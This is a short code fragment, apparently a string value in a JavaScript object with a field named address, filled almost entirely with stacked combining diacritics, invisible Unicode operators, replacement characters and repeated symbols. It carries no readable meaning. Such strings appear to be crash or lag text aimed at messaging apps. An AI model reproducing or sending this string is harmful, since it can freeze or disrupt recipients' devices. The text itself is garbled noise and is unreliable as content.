̡͖͉̙͓̳̮͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͝